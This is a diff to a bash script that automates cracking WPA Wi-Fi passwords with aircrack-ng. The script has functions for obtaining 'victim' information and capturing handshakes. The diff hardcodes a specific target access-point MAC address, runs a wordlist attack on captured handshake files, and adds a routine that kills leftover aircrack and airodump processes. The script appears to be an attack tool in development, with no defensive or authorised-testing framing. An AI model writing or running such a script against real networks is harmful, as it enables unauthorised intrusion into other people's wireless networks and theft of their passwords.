@@ -161,22 +161,82 @@ wordlist_crack() {
 	sleep 1
 	cd ..
 
-	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap"
+	#DELETE THIS WHEN DONE
+	APMAC=AC:22:0B:85:7E:B1	
+	#	
+
+	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap" &
+	echo 
+	
+	#Prompts user to exit aircrack by pressing enter
+	read -p "Press <enter> to exit aircrack... " 
+	read -p "Are you sure [Y/N]? " RESPONSE
+	case $RESPONSE in
+		[Yy]* ) end_attack ;;
+		[Nn]* ) echo Continuing aircrack... ;;
+		* ) echo "Entered invalid response..." ;;
+	esac
+
+	echo
+	
+	while [ ! "$RESPONSE" = "Y" ] && [ ! "$RESPONSE" = "y" ]
+	do
+		read -p "Press <enter> to exit aircrack... " 
+		read -p "Are you sure [Y/N]? " RESPONSE
+		
+		case $RESPONSE in
+			[Yy]* ) end_attack ;;
+			[Nn]* ) echo Continuing aircrack... ;;
+		        * ) echo Entered invalid response... ;;
+		esac
+	
+		echo 
+	done
 }
 
-#MAKE THIS TOMORROW!!!
 end_attack() {
-	#kills any other processes (any aircracks, airdumps left)
+	
+	echo Killing any remaining processes...
+	sleep 1
+
+	# Kills any leftover aircrack processes
+	CRACKPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
+	echo aircrack-ng processes found: $CRACKPID
+	sleep 1
+
+	if [ -n "$CRACKPID" ]; then
+		echo Killing these processes
+		kill -15 $CRACKPID
+	else
+		echo "No such processes were found."
+	fi
+
+	echo
+
+	# Kills any leftover airodump processes
+	DUMPPID=`ps -ef | grep "\bairodump\b" | awk '{print $2}'`
+	echo airodump-ng processes found: $DUMPPID
+	sleep 1
+
+	if [ -n "$DUMPPID" ]; then
+		echo Killing these processes
+		kill -15 $DUMPPID
+	else
+		echo "No such processes were found."
+	fi
+
+	sleep 1
+	echo Wordlist attack has ended.
 }
 
 #-------------------------------#
 #	MAIN EXECUTION		#
 #-------------------------------#
 
-obtain_interface
-monitor_mode
-obtain_victim_info
-obtain_channel
-wpa_handshake
+#obtain_interface
+#monitor_mode
+#obtain_victim_info
+#obtain_channel
+#wpa_handshake
 	#ADD AN OPTION TO INCLUDE NAME OF PSK FILE
 wordlist_crack
